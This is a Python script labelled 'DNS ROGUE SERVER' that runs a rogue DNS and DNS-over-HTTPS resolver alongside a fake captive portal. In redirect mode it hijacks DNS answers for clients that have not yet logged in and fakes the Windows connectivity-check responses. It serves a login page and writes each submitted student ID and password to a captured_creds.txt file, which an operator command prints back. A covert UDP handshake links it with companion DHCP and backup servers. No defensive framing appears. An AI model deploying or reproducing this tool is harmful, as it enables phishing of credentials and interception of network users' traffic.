import socket
import threading
import time
import os
import base64
import logging
import dns.resolver
from dnslib import DNSRecord, RR, QTYPE, A
from flask import Flask, request, make_response
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# --- Logging Setup ---
log_flask = logging.getLogger('werkzeug')
log_flask.setLevel(logging.ERROR)

def get_dynamic_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# --- Configuration ---
HOST = get_dynamic_ip()
PORT = 53
UPSTREAM_DNS = '8.8.8.8'
UPSTREAM_PORT = 53
SOCKET_TIMEOUT = 3.0
CACHE_CLEAN_INTERVAL = 300
LOG_FILE = "DNS.log"
CREDS_FILE = "captured_creds.txt"
HTML_FILE = "index.html"

# DoH & Security Configuration
DOH_PORT = 443
DOH_ENDPOINT = "/dns-query"
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"

GLOBAL_SERVERS = {
    "Google Primary": "8.8.8.8",
    "Google Secondary": "8.8.4.4",
    "Cloudflare": "1.1.1.1",
    "Quad9": "9.9.9.9",
    "OpenDNS": "208.67.222.222",
    "Level3": "4.2.2.1",
    "Comodo": "8.26.56.26",
    "CleanBrowsing": "185.228.168.9",
    "Yandex": "77.88.8.8",
    "Verisign Primary": "64.6.64.6",
    "Verisign Secondary": "64.6.65.6"
}

# --- State Management ---
REDIRECT_ALL = False
WHITELISTED_IPS = set()

# --- Dynamic DNS Records ---
LOCAL_RECORDS = {}

cache = {}
cache_lock = threading.Lock()
log_lock = threading.Lock()

def log(message):
    with log_lock:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {message}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry + "\n")

# --- Utilities ---
def cache_cleaner():
    while True:
        time.sleep(CACHE_CLEAN_INTERVAL)
        removed = 0
        with cache_lock:
            now = time.time()
            expired_keys = [k for k, v in cache.items() if v[1] < now]
            for key in expired_keys:
                del cache[key]
                removed += 1
        if removed > 0:
            log(f"Cache cleanup: removed {removed} entries.")

def forward_query(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.sendto(data, (UPSTREAM_DNS, UPSTREAM_PORT))
        response, _ = sock.recvfrom(4096)
        return response
    except:
        return None
    finally:
        sock.close()

# --- DNS Core Logic ---
def process_dns_logic(data, client_ip, protocol="UDP"):
    try:
        request_pkt = DNSRecord.parse(data)
        qname = str(request_pkt.q.qname)
        qtype = request_pkt.q.qtype

        log(f"Request [{protocol} {client_ip}]: FQDN={qname} Type={qtype}")

        if qname in LOCAL_RECORDS and qtype == QTYPE.A:
            log(f"LOCAL MATCH [{protocol} {client_ip}]: {qname} -> {LOCAL_RECORDS[qname]}")
            reply = request_pkt.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(LOCAL_RECORDS[qname]), ttl=60))
            return reply.pack()

        # HIJACK LOGIC (Captive Portal)
        if REDIRECT_ALL and qtype == QTYPE.A and client_ip not in WHITELISTED_IPS:
            log(f"HIJACK [{protocol} {client_ip}]: {qname} -> {HOST}")
            reply = request_pkt.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=5))
            return reply.pack()

        with cache_lock:
            if (qname, qtype) in cache:
                raw_resp, expiry = cache[(qname, qtype)]
                if time.time() < expiry:
                    cached_resp = DNSRecord.parse(raw_resp)
                    cached_resp.header.id = request_pkt.header.id
                    return cached_resp.pack()
                else:
                    del cache[(qname, qtype)]

        response_data = forward_query(data)
        if response_data:
            response_record = DNSRecord.parse(response_data)
            ttl = 60
            if response_record.rr:
                ttl = min([rr.ttl for rr in response_record.rr])

            with cache_lock:
                cache[(qname, qtype)] = (response_data, time.time() + ttl)

            return response_data

    except Exception as e:
        log(f"Error processing {protocol}: {e}")

    return None

# --- Server Components ---
def handle_dns_client(data, addr, sock):
    resp = process_dns_logic(data, addr[0], "UDP")
    if resp:
        sock.sendto(resp, addr)

def run_dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((HOST, PORT))
        log(f"UDP Server Active on {HOST}:{PORT}")
        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(
                target=handle_dns_client,
                args=(data, addr, sock),
                daemon=True
            ).start()
    except PermissionError:
        log("Permission denied for Port 53")
        os._exit(1)

def run_secret_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind(('0.0.0.0', 9999))
        log("Companion discovery listener started on port 9999")

        dhcp_linked = False
        backup_linked = False

        while not (dhcp_linked and backup_linked):
            data, addr = sock.recvfrom(1024)

            # 1. DHCP Server Handshake
            if data == b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD" and not dhcp_linked:
                sock.sendto(b"COME_ON_BARBIE_LETS_GO_PARTY", addr)
                log(f"DHCP Server discovered from {addr[0]}. Replied.")
                dhcp_linked = True

            # 2. Backup Server Handshake
            elif data == b"I am alive" and not backup_linked:
                sock.sendto(b"I see you", addr)
                # Map 'backup.com.' (trailing dot for FQDN) to the Backup Server's IP
                LOCAL_RECORDS["backup.com."] = addr[0]
                log(f"Backup Server discovered from {addr[0]}. Linked 'backup.com'.")
                backup_linked = True

        log("Infrastructure sync complete: Both DHCP and Backup components linked. Closing discovery listener.")

    except Exception as e:
        log(f"Secret listener error: {e}")
    finally:
        sock.close()

# --- Web & DoH ---
app = Flask(__name__)

@app.route(DOH_ENDPOINT, methods=['GET', 'POST'])
def doh_handler():

    dns_query = None

    if request.method == "POST":
        dns_query = request.data

    elif request.method == "GET":
        dns_b64 = request.args.get("dns")
        if dns_b64:
            padding = "=" * (4 - len(dns_b64) % 4)
            dns_query = base64.urlsafe_b64decode(dns_b64 + padding)

    if not dns_query:
        return "Bad Request", 400

    resp_data = process_dns_logic(
        dns_query,
        request.remote_addr,
        protocol="DoH"
    )

    if resp_data:
        r = make_response(resp_data)
        r.headers["Content-Type"] = "application/dns-message"
        return r

    return "Timeout", 504

def run_doh_server():

    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        context = (CERT_FILE, KEY_FILE)
    else:
        context = "adhoc"
        log("Certificates not found, falling back to adhoc")

    app.run(
        host=HOST,
        port=DOH_PORT,
        ssl_context=context,
        threaded=True,
        use_reloader=False
    )

class CaptivePortalHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        if "connecttest.txt" in self.path or "ncsi.txt" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Action Required")
            return

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        if os.path.exists(HTML_FILE):
            with open(HTML_FILE, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.wfile.write(b"<h1>Portal</h1><p>Login to connect.</p>")

    def do_POST(self):

        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode("utf-8")

        params = parse_qs(post_data)

        user = params.get("student_id", ["N/A"])[0]
        pw = params.get("password", ["N/A"])[0]

        client_ip = self.client_address[0]

        with open(CREDS_FILE, "a") as f:
            f.write(
                f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] "
                f"IP: {client_ip} | ID: {user} | Pass: {pw}\n"
            )

        WHITELISTED_IPS.add(client_ip)
        log(f"LOGIN SUCCESS: {client_ip} whitelisted.")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        self.wfile.write(b"<h1>Connected!</h1>")

    def log_message(self, format, *args):
        pass

# --- Startup ---
if __name__ == "__main__":

    os.system("clear" if os.name == "posix" else "cls")

    print("-" * 60)
    print("DNS ROGUE SERVER")
    print(f"Interface: {HOST}")
    print(f"Log File: {os.path.abspath(LOG_FILE)}")
    print("NOTE: Real-time request events are hidden. View 'DNS.log' for details.")
    print("Commands: 'redirect', 'creds', 'clear', 'exit' or [domain]")
    print("-" * 60)

    threading.Thread(target=cache_cleaner, daemon=True).start()
    threading.Thread(target=run_dns_server, daemon=True).start()
    threading.Thread(target=run_doh_server, daemon=True).start()
    threading.Thread(target=run_secret_listener, daemon=True).start()
    threading.Thread(
        target=lambda: HTTPServer((HOST, 80), CaptivePortalHandler).serve_forever(),
        daemon=True
    ).start()

    while True:
        try:

            cmd = input("\ndns-cli> ").strip().lower()

            if not cmd or cmd in ["exit", "quit"]:
                break

            elif cmd == "redirect":
                REDIRECT_ALL = not REDIRECT_ALL
                print(f"[*] Redirect Mode: {'ENABLED' if REDIRECT_ALL else 'DISABLED'}")

            elif cmd == "creds":

                if os.path.exists(CREDS_FILE):
                    with open(CREDS_FILE, "r") as f:
                        print(f.read())
                else:
                    print("[!] No creds yet.")

            elif cmd == "clear":
                WHITELISTED_IPS.clear()
                print("[*] Whitelist cleared.")

            else:

                print(f"\n--- Propagation Test: {cmd} ---")
                print(f"{'provider':<20} | {'status/ip':<15} | {'latency'}")
                print("-" * 55)

                for name, ip in GLOBAL_SERVERS.items():

                    res = dns.resolver.Resolver(configure=False)
                    res.nameservers = [ip]
                    res.timeout = 2.0

                    start_time = time.time()

                    try:
                        ans = res.resolve(cmd, "A")
                        latency = round((time.time() - start_time) * 1000, 2)

                        print(f"{name:<20} | {ans[0].to_text():<15} | {latency}ms")

                    except:
                        print(f"{name:<20} | {'down/timeout':<15} | n/a")

        except KeyboardInterrupt:
            break

    log("shutting down")
    print("\nSHUTDOWN: Stopping all threads...")
